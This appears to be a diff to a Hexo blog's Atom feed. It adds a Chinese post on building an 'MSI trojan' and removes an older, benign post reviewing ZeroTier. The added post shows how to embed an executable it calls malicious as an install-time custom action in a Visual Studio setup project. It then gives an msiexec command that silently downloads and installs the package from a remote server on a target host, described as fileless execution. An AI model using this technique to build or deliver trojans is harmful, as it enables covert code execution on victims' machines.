@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-07-02T08:59:38.601Z</updated>
+  <updated>2023-09-09T02:26:38.525Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>msi木马创建</title>
+    <link href="http://example.com/post/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/"/>
+    <id>http://example.com/post/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/</id>
+    <published>2023-08-22T02:30:44.000Z</published>
+    <updated>2023-09-09T02:26:38.525Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="MSI文件">MSI文件</h1><p><code>MSI 文件</code>指的是 <code>Windows Installer Package </code>文件，它是一种用于安装、升级、修复和卸载软件的安装程序包格式。</p><p>Windows Installer 是 Microsoft Windows 操作系统中的一种安装技术，用于管理和执行软件的安装和卸载过程。MSI 文件是 Windows Installer 技术的核心组成部分，它以.msi 文件扩展名来标识。</p><p>MSI 文件是一种数据库式文件，其中包含了安装程序所需的文件、注册表项、配置信息、脚本和其他相关组件。它提供了一种标准化的方式来描述和定义软件的安装过程，使得软件的安装和管理更加可靠和可预测。</p><p>通过运行 MSI 文件，Windows Installer 将打开一个安装向导，引导用户完成软件的安装过程。安装过程中，Windows Installer 会根据 MSI 文件中的指令和设置，将文件复制到适当的位置，注册组件、创建快捷方式，执行系统配置等操作，最终将软件成功安装到目标计算机上。</p><p>MSI 文件具有一些特性，如安装过程的事务性、修复和升级功能、卸载功能、自定义操作等。它们被广泛用于 Windows 系统中的软件安装，包括应用程序、驱动程序、插件和组件等。</p><p>需要注意的是，运行 MSI 文件通常需要管理员权限或适当的安装权限，以确保安装过程能够成功地对系统进行更改和配置。</p><p>常见的msi:</p><p><img src="image-20230831230437851.png" alt="image-20230831230437851"></p><h1 id="木马制作思路">木马制作思路</h1><p>在MSI软件包中，<code>制作者可以使用自定义操作（Custom Actions）来执行特定的任务</code>，例如运行可执行文件、执行脚本、修改注册表等。当执行安装过程时，MSI软件包会按照事先定义的规则和流程执行这些自定义操作。如果将恶意的exe（也可以是dll、js和vbs）文件作为msi安装过程中要运行的文件，将直接触发恶意代码。</p><p><code>msiexec</code>是Windows操作系统中的命令行实用程序，用于处理MSI（Microsoft Installer）文件。它是Microsoft Installer的执行引擎，负责解析和执行MSI文件中定义的安装、修复、更新和卸载操作。msiexec支持<code>远程加载</code>msi文件并安装。</p><p>相当于通过msiexec间接运行我们的恶意exe，整个过程无文件落地。</p><h1 id="创建msi文件">创建msi文件</h1><p>msi文件可以通过<a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">Advanced Installer</a><a href="https://jingyan.baidu.com/article/358570f614e0958f4724fcde.html">1</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">，Discover</a><a href="https://jingyan.baidu.com/article/15622f24ad7835fdfdbea55f.html">2</a>，或者Visual Studio等方式创建，这里我们以Visual Studio 2022为例。</p><h2 id="下载安装插件">下载安装插件</h2><p>首先要下载安装<code>Visual Studio Installer Projects</code>插件，在vs中点击左上角<code>拓展</code>—&gt;<code>管理拓展</code>，直接搜索下载安装</p><p><img src="image-20230831232418630.png" alt="image-20230831232418630"></p><p>这样可能会比较慢，也可以直接下载<a href="https://marketplace.visualstudio.com/items?itemName=VisualStudioClient.MicrosoftVisualStudio2022InstallerProjects">拓展包</a>安装。</p><h2 id="添加Setup-Project项目">添加Setup Project项目</h2><p>创建一个新的<code>Setup Project</code>项目</p><p><img src="image-20230831232701251.png" alt="image-20230831232701251"></p><p>添加<code>项目输出</code></p><p><img src="image-20230831232813669.png" alt="image-20230831232813669"></p><p>选择<code>主输出</code></p><p><img src="image-20230831232832022.png" alt="image-20230831232832022"></p><blockquote><p>可能会遇到项目输出是空的情况，应该是解决方案配置的问题，建议不要创建一个Setup Project项目的解决方案，而是在已有解决方案项目的情况下添加Setup Project项目</p><p><img src="image-20230831234805675.png" alt="image-20230831234805675"></p></blockquote><h2 id="添加恶意exe">添加恶意exe</h2><p>右键项目选择<code>自定义操作</code></p><p><img src="image-20230831232942395.png" alt="image-20230831232942395"></p><p>发现有四个操作分别为<code>&quot;安装&quot;、&quot;提交&quot;、&quot;回滚&quot;和&quot;卸载&quot;</code></p><p><img src="image-20230831233023014.png" alt="image-20230831233023014"></p><p>在安装程序中，“安装”、“提交”、&quot;回滚&quot;和&quot;卸载&quot;是四个常见的操作类型，它们用于描述不同的安装过程中的行为和阶段。</p><ol><li>安装（Install）：安装操作是指将应用程序或软件包安装到目标计算机上的过程。在安装操作中，文件、注册表项、服务、组件等将被复制、配置和注册到目标计算机的适当位置。通常，安装操作会创建所需的目录结构、注册必要的组件，并执行其他必要的配置任务。</li><li>提交（Commit）：提交操作是指在安装过程中，当所有的文件和配置都已成功复制和注册到目标计算机时，确认将更改应用到系统的阶段。在提交操作之前，所有的安装操作都被视为临时性的。提交操作会将安装所做的更改永久性地应用到系统中，以确保应用程序的完整性和可用性。</li><li>回滚（Rollback）：回滚操作是指当安装过程中发生错误或遇到问题时，将安装过程还原到初始状态的过程。如果在安装过程中出现错误，安装程序可以回滚（撤销）之前的所有操作，以恢复目标计算机到安装前的状态，以避免对系统造成不可逆的更改。</li><li>卸载（Uninstall）：卸载操作是指从目标计算机中完全移除已安装的应用程序或软件包的过程。在卸载操作中，与安装过程相反，文件、注册表项、服务等与应用程序相关的组件将被删除，以及执行其他必要的清理任务。</li></ol><p>我们选择”安装“，右键添加自定义操作</p><p>Add File可以添加具体的运行文件，这里以一个简单的弹框exe模拟恶意脚本</p><p><img src="image-20230831233355250.png" alt="image-20230831233355250"></p><p>点击OK则成功添加到”安装“操作中</p><p><img src="image-20230831233542197.png" alt="image-20230831233542197"></p><p>点击重新生成将生成两个文件，msi文件就是我们嵌入了恶意exe的目标文件</p><p><img src="image-20230831233711946.png" alt="image-20230831233711946"></p><h1 id="利用">利用</h1><p>先用python起一个临时服务器，然后再目标主机上运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /i msi文件的url地址 /q TARGETDIR=&quot;C:/Users/Public/Documents&quot;</span><br></pre></td></tr></table></figure><ul><li><code>/i</code> 是 msiexec 命令的参数，表示执行安装操作。</li><li><code>/q</code> 是 msiexec 命令的参数，表示以安静（静默）模式执行安装，即在不显示任何用户界面的情况下执行安装过程。</li><li>TARGETDIR指定程序的安装位置，不指定的话则默认安装到Program Files下，则会有权限不够以及UAC的情况</li></ul><p>发现恶意exe被执行（messagebox.exe的功能就是弹出一个niupi）</p><p><img src="image-20230831234223966.png" alt="image-20230831234223966"></p><p>参考：</p><p><a href="https://blog.csdn.net/syzcyyx/article/details/129482721">使用VisualStudio2022插件(Visual Studio Installer Projects 2022)打包 .Net 6 框架下的 WPF项目 为安装文件</a></p><p><a href="https://blog.csdn.net/weixin_44790046/article/details/103016154">VS2019打包生成安装文件图文详细教程</a></p><p><a href="https://blog.csdn.net/wmonica121/article/details/13503791">vs2010打包程序   项目输出组为空</a></p><p><a href="https://www.c-sharpcorner.com/article/how-to-perform-custom-actions-and-upgrade-using-visual-studio-installer/">如何使用 Visual Studio 安装程序执行自定义操作和升级 (c-sharpcorner.com)</a></p><p><a href="https://www.red-gate.com/simple-talk/development/dotnet-development/visual-studio-setup-projects-and-custom-actions/">Visual Studio 设置 - 项目和自定义操作 - 简单对话 (red-gate.com)</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;MSI文件&quot;&gt;MSI文件&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;MSI 文件&lt;/code&gt;指的是 &lt;code&gt;Windows Installer Package &lt;/code&gt;文件，它是一种用于安装、升级、修复和卸载软件的安装程序包格式。&lt;/p&gt;
+&lt;p&gt;Windows In</summary>
+      
+    
+    
+    
+    <category term="技术" scheme="http://example.com/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+    <category term="木马" scheme="http://example.com/tags/%E6%9C%A8%E9%A9%AC/"/>
+    
+  </entry>
   
   <entry>
     <title>一个简单的准接入</title>
@@ -508,32 +534,6 @@
     <category term="alist" scheme="http://example.com/tags/alist/"/>
     
     <category term="seafile" scheme="http://example.com/tags/seafile/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Zerotier的使用体验</title>
-    <link href="http://example.com/post/zerotier/"/>
-    <id>http://example.com/post/zerotier/</id>
-    <published>2023-02-11T04:57:18.000Z</published>
-    <updated>2023-03-22T13:01:46.500Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="背景">背景</h1><p>我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）</p><p>一开始怀疑是我的ddns脚本出了问题，因为阿里云的解析日志一直没有更新，就想通过<strong>爆破</strong>的方式获得真实的ipv6地址，也失败了（不得不说ipv6空间范围是真的大，开10个线程爆了我2小时，呜呜呜~~~）</p><p><img src="https://image.3001.net/images/20220208/16443286461724.png" alt="img"></p><p>周末回到家（论工作地点离家近的重要性hhh）才发现是ipv6地址被<strong>回收</strong>了，只给我留了个<strong>fe80</strong>开头的内网ipv6地址</p><p><img src="ed356665c6d9454b8696d70828f6d416.jpeg" alt="img"></p><p>重启路由器的ipv6开关以后又重新得到了ipv6地址（这里不知道是路由器配置的问题还是什么原因，有懂的师傅欢迎在评论区补充）</p><p>为了防止这种情况再次发生，除了ipv6直接访问以外我还得有一种备用措施，在没有ipv6的情况下也能访问内网设备，于是Zerotier成为了我的目标</p><h1 id="Zerotier">Zerotier</h1><p>Zerotier是一款用于构建<strong>异地虚拟局域网</strong>的工具，通过网页后台创建虚拟网络并通过电脑上的Zerotier客户端连接各个异地电脑到虚拟局域网，从而实现组网由后台分配虚拟ip，并且各个异地电脑可以通过虚拟IP对同一虚拟局域网下的其他电脑进行访问</p><p><img src="43d97752d6ff40539818eefbcb6289e2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="安装配置">安装配置</h2><p>Zerotier的安装配置都比较简单，可参照b站上这位up主的视频</p><p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?buvid=XU7B1187220CEA5BEB8E1D6547D1ECD2814F4&amp;is_story_h5=false&amp;mid=CZP6291YuQ9EvlArsK6mQw%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=bb883d71-ff0f-45c4-ac3a-cdd56ff7cf9b&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1676083314&amp;unique_k=arTrXpi&amp;up_id=35973342&amp;vd_source=b2a0cc29ab6a8cf18c26c53dcd232ca4">强大的内网穿透工具ZeroTier，随时随地远程访问家中NAS和其它设备！没有公网IP也不怕_哔哩哔哩_bilibili</a></p><p>同时centos 的安装可以参照这位大佬的文章</p><p><a href="https://blog.csdn.net/COCO56/article/details/123296985#">https://blog.csdn.net/COCO56/article/details/123296985#</a></p><h2 id="体验">体验</h2><p>Zerotier和传统的内网穿透工具不同，并不是通过一个中转服务器来建立连接的，而是使用端到端的<strong>p2p</strong>协议（在连接不稳定的时候也会采用中转服务器的方式建立连接）</p><p><img src="d14f7e6dbc424d29a8a9137b177fb8a2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>可以看到延迟并不算很高，这几天用下来个人还是比较满意的</p><p>通过这种方式可以部署一些<strong>只有内网ipv4才可以访问</strong>的服务，例如我就用niginx开了个ipv4的端口，将数据转发到了路由器上，下次ipv6出现问题也就可以直接通过Zerotier访问路由器重启ipv6服务</p><h2 id="安全性">安全性</h2><p>Zerotier作为一款强大的网络存取服务，拥有内置的AES-256加密算法，并提供安全控制，可以控制用户连接的访问，以限制对私有网络的访问，并防止未经授权的访问，所以Zerotier的安全性还是比较高的</p><h1 id="结语">结语</h1><p>总的来说，ZeroTier的使用确实非常容易。它的简单易用性，功能丰富的网络功能和强大的安全特性，使ZeroTier成为最佳的专业网络解决方案，特别是在新兴兼容性和技术能力需求时期。</p><p>（此段结语由ChatGPT生成，嘻嘻~~，总的来说Zerotier还是比较简单好用的，有内网访问需求的伙伴们可以考虑使用）</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;背景&lt;/h1&gt;
-&lt;p&gt;我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）&lt;/p&gt;
-&lt;p&gt;一开始怀疑是我的</summary>
-      
-    
-    
-    
-    <category term="使用体验" scheme="http://example.com/categories/%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"/>
-    
-    
-    <category term="zerotier" scheme="http://example.com/tags/zerotier/"/>
     
   </entry>
   
